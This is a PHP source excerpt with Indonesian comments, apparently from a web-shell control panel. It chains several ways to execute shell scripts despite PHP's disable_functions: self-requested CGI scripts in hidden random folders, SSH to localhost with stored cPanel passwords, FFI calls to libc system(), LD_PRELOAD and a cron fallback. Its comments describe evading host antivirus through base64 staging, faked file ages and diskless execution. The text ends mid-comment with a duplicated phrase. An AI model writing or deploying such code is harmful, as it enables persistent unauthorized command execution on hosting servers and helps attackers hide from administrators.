/* JALUR 3: CGI SELF-REQUEST — Apache (atau LiteSpeed) yang mengeksekusi
   script, BUKAN PHP, jadi disable_functions sama sekali tidak berlaku.
   Panel menulis .htaccess (ExecCGI) + script .gspcgi di subfolder ACAK
   lalu memanggilnya lewat HTTP ke diri sendiri. Subfolder dipakai supaya
   kalau host menolak Options +ExecCGI (500), hanya subfolder itu yang
   kena — panel di folder induk tetap hidup, lalu jatuh ke jalur berikutnya. */
function gsp_cgi_exec($script, $env) {
    $doc = dirname(__FILE__);
    $dir = $doc . '/.gspcgi_' . substr(md5(microtime() . rand()), 0, 10);
    if (!@mkdir($dir, 0755)) return false;
    gsp_stealth_age($dir);
    if (@file_put_contents($dir . '/.htaccess', "Options +ExecCGI\nAddHandler cgi-script .gspcgi\n") !== false) gsp_stealth_age($dir . '/.htaccess');
    $ep = '';
    foreach ($env as $k => $v) $ep .= 'export ' . $k . '=' . escapeshellarg($v) . "\n";
    $cg = $dir . '/r.gspcgi';
    $body = "#!/bin/sh\n" . $ep
          . "echo 'Content-Type: text/plain'\necho ''\necho 'GSP_CGI_' 'ALIVE'\n"
          . "base64 -d <<'GSP_EOF' | " . gsp_sh_bin() . " 2>&1\n" . base64_encode($script) . "\nGSP_EOF\n";
    if (@file_put_contents($cg, $body) === false) { gsp_rm_rf($dir); return false; }
    @chmod($cg, 0755);
    gsp_stealth_age($cg);
    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
    $host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost';
    $sn = isset($_SERVER['SCRIPT_NAME']) ? $_SERVER['SCRIPT_NAME'] : '/' . basename(__FILE__);
    $base = dirname($sn);
    if ($base === '/' || $base === '\\' || $base === '.') $base = '';
    $url = $scheme . '://' . $host . $base . '/' . basename($dir) . '/r.gspcgi';
    $out = null;
    if (fum_fn_ok('curl_init') && !fum_disabled('curl_exec')) {
        $ch = @curl_init();
        @curl_setopt($ch, CURLOPT_URL, $url);
        @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        @curl_setopt($ch, CURLOPT_TIMEOUT, 900);
        @curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 20);
        @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        @curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        $res = @curl_exec($ch);
        $code = intval(@curl_getinfo($ch, CURLINFO_HTTP_CODE));
        @curl_close($ch);
        /* v66.3 fix D2: marker di source dipecah ('GSP_CGI_' 'ALIVE') + respon
           mengandung GSP_EOF = source tersaji mentah (static 200) -> TOLAK,
           jangan klaim eksekusi palsu. */
        if ($code === 200 && is_string($res) && strpos($res, 'GSP_CGI_ALIVE') !== false && strpos($res, 'GSP_EOF') === false) $out = $res;
    }
    if ($out === null && function_exists('fsockopen') && !fum_disabled('fsockopen')) {
        $hp = explode(':', $host);
        $hname = $hp[0];
        $port = isset($hp[1]) ? intval($hp[1]) : ($scheme === 'https' ? 443 : 80);
        $fp = @fsockopen(($scheme === 'https' ? 'ssl://' : '') . $hname, $port, $en, $es, 20);
        if ($fp) {
            $path = $base . '/' . basename($dir) . '/r.gspcgi';
            @fwrite($fp, "GET $path HTTP/1.0\r\nHost: $host\r\nConnection: close\r\n\r\n");
            $raw = gsfu_stream_read($fp);
            @fclose($fp);
            $parts = explode("\r\n\r\n", $raw, 2);
            if (count($parts) === 2 && strpos($parts[0], ' 200') !== false && strpos($parts[1], 'GSP_CGI_ALIVE') !== false && strpos($parts[1], 'GSP_EOF') === false) $out = $parts[1];
        }
    }
    gsp_rm_rf($dir);
    if ($out === null) return false;
    echo colorize("[>] dieksekusi lewat CGI Apache (kebal disable_functions PHP)\n");
    echo_lines($out);
    return true;
}

/* JALUR 4: SSH2 LOCALHOST — ekstensi ssh2 + password cPanel (yang dipakai
   login di kartu Status Koneksi). ssh2_exec BUKAN fungsi exec PHP biasa
   sehingga nyaris tidak pernah ikut di-disable; sshd lokal = shell asli. */
function gsp_ssh2_exec($script, $env) {
    if (!extension_loaded('ssh2') || !function_exists('ssh2_connect')) return false;
    if (fum_disabled('ssh2_connect')) return false;
    $u = isset($_SESSION['fum_cpuser']) ? $_SESSION['fum_cpuser'] : '';
    $p = isset($_SESSION['fum_cppass']) ? $_SESSION['fum_cppass'] : '';
    if ($u === '' || $p === '') return false;
    $c = @ssh2_connect('127.0.0.1', 22);
    if (!$c) $c = @ssh2_connect('localhost', 22);
    if (!$c) return false;
    if (!@ssh2_auth_password($c, $u, $p)) return false;
    $ep = '';
    foreach ($env as $k => $v) $ep .= $k . '=' . escapeshellarg($v) . ' ';
    $cmdline = 'echo GSP_SSH2_ALIVE; echo ' . base64_encode($script) . ' | base64 -d | ' . $ep . gsp_sh_bin() . ' 2>&1';
    $st = @ssh2_exec($c, $cmdline);
    if (!$st) return false;
    @stream_set_blocking($st, true);
    $out = gsfu_stream_read($st);
    @fclose($st);
    if (!is_string($out) || strpos($out, 'GSP_SSH2_ALIVE') === false) return false;
    echo colorize("[>] dieksekusi lewat SSH localhost (kebal disable_functions PHP)\n");
    echo_lines($out);
    return true;
}

function run_stream($script, $env, $so_b64) {
    /* hosting free sering mematikan PHP di 30 dtk padahal installer butuh lebih
       (ekstrak + start daemon + tes relay). Longgarkan limit + jangan batalkan
       saat koneksi browser putus — set_time_limit jarang ikut di-disable. */
    @set_time_limit(0);
    @ini_set('max_execution_time', '0');
    @ignore_user_abort(true);
    $script = str_replace("\r\n", "\n", $script);
    $script = str_replace("\r", "", $script);
    /* HOME/USER/PATH dari sisi PHP (gsp_home tahan-disable_functions) disuntikkan
       ke bash — kalau tidak, bash mewarisi HOME salah (mis /var/www read-only)
       dan registry gagal ditulis: instance jalan tapi panel tidak pernah mencatat */
    $env = array_merge(array(
        'PATH' => '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin',
        'HOME' => gsp_home(),
        'USER' => my_user(),
    ), $env);
    $ep = '';
    foreach ($env as $k => $v) $ep .= $k . '=' . escapeshellarg($v) . ' ';
    $done = false;
    /* hook UJI (jangan dipakai produksi): GSP_NOEXEC=1 mensimulasikan hosting
       yang mematikan SEMUA fungsi exec — semua jalur exec diloncati, runner
       jatuh ke antrian zero-shell */
    $gsp_noexec = getenv('GSP_NOEXEC');
    $gsp_noexec = (is_string($gsp_noexec) && $gsp_noexec !== '' && $gsp_noexec !== '0');

    /* JALUR 1 (utama): script disuplai ke bash lewat STDIN — TIDAK ADA file
       script di disk sama sekali. Kebal cleaner/AV host yang menulis-ulang
       file script di /tmp (terbukti di host ini: file script diubah jadi
       base64 beberapa saat setelah ditulis, lalu bash mengeksekusi base64
       -> spam "command not found"). */
    if (!$gsp_noexec && function_exists('proc_open')) {
        $pipes = array();
        $proc = @proc_open(gsp_sh_bin() . ' -s 2>&1',
            array(0 => array('pipe', 'r'), 1 => array('pipe', 'w'), 2 => array('pipe', 'w')),
            $pipes, null, $env);
        if (is_resource($proc)) {
            @stream_set_blocking($pipes[1], false);
            if (isset($pipes[2])) @stream_set_blocking($pipes[2], false);
            $off = 0; $len = strlen($script); $wopen = true; $t0 = time();
            while (true) {
                if ($wopen) {
                    $n = @fwrite($pipes[0], substr($script, $off, 65536));
                    if ($n === false || $n === 0) { usleep(20000); }
                    else { $off += $n; }
                    if ($off >= $len) { fclose($pipes[0]); $wopen = false; }
                }
                $got = false;
                $o = @fgets($pipes[1]);
                if ($o !== false) { echo colorize($o); flush(); $got = true; }
                if (isset($pipes[2])) {
                    $e = @fgets($pipes[2]);
                    if ($e !== false) { echo colorize($e); flush(); $got = true; }
                }
                if (!$wopen && feof($pipes[1])) break;
                if (!$got) usleep(50000);
                if (time() - $t0 > 1500) break; /* sabuk pengaman */
            }
            @fclose($pipes[1]);
            if (isset($pipes[2])) @fclose($pipes[2]);
            @proc_close($proc);
            $done = true;
        }
    }

    /* JALUR 2: proc_open mati -> terpaksa lewat file, tapi disimpan sebagai
       BASE64 (inert bagi scanner script) dan di-decode on-the-fly ke bash.
       File dihapus di akhir perintah yang sama. */
    if (!$done && $gsp_noexec) { /* v66.3 fix D7: hook uji meloncati SEMUA jalur exec, bukan hanya JALUR 1 */ }
    elseif (!$done) {
        $f = tmp_dir() . '/.gsp_' . md5(microtime() . rand());
        if (@file_put_contents($f, chunk_split(base64_encode($script), 200, "\n")) !== false) {
            @chmod($f, 0600);
            gsp_stealth_age($f);
            /* v66.3 fix D1: env-prefix HARUS di kanan pipe — assignment VAR=x
               di kiri pipe hanya mengenai base64, sh tidak mewarisi GSP_TGZ/
               HOME sehingga installer jatuh ke download & daemon liar. */
            $cmd = 'base64 -d ' . escapeshellarg($f) . ' | ' . $ep . gsp_sh_bin() . ' 2>&1; rm -f ' . escapeshellarg($f);
            if (!$done && function_exists('popen')) {
                $p = @popen($cmd, 'r');
                if (is_resource($p)) {
                    while (!feof($p)) {
                        $line = fgets($p);
                        if ($line === false) { usleep(50000); continue; }
                        echo colorize($line); flush();
                    }
                    pclose($p);
                    $done = true;
                }
            }
            if (!$done && function_exists('shell_exec')) {
                $out = @shell_exec($cmd);
                if (is_string($out) && $out !== '') { echo_lines($out); $done = true; }
            }
            if (!$done && function_exists('exec')) {
                $lines = array();
                @exec($cmd, $lines);
                if (count($lines) > 0) { foreach ($lines as $l) echo colorize($l . "\n"); $done = true; }
            }
            if (!$done && function_exists('system')) {
                @ob_start();
                @system($cmd);
                $out = @ob_get_clean();
                if (is_string($out) && trim($out) !== '') { echo_lines($out); $done = true; }
            }
            if (!$done && function_exists('passthru')) {
                @ob_start();
                @passthru($cmd);
                $out = @ob_get_clean();
                if (is_string($out) && trim($out) !== '') { echo_lines($out); $done = true; }
            }
            if (!$done && extension_loaded('ffi') && class_exists('FFI') && version_compare(PHP_VERSION, '7.4', '>=')) {
                $ffi = @eval('try { return FFI::cdef("int system(const char *command);", "libc.so.6"); } catch (Exception $e) { return null; } catch (Throwable $e) { return null; }');
                if ($ffi) {
                    @ob_start();
                    $ffi->system($cmd);
                    $out = @ob_get_clean();
                    if (is_string($out) && trim($out) !== '') { echo_lines($out); $done = true; }
                }
            }
            if (!$done) $done = run_ldpreload($cmd, $so_b64);
            if (empty($GLOBALS['gsp_queued'])) @unlink($f);
        }
    }

    if (!$done && !$gsp_noexec) $done = gsp_cgi_exec($script, $env);
    if (!$done && !$gsp_noexec) $done = gsp_ssh2_exec($script, $env);

    if (!$done) {
        /* JALUR 5 ZERO-SHELL (resort terakhir): semua exec mati -> antrikan ke guard cron (crond = semua exec mati -> antrikan ke guard cron (crond =
           shell asli, kebal disable_functions). Payload SELF-CONTAINED: script
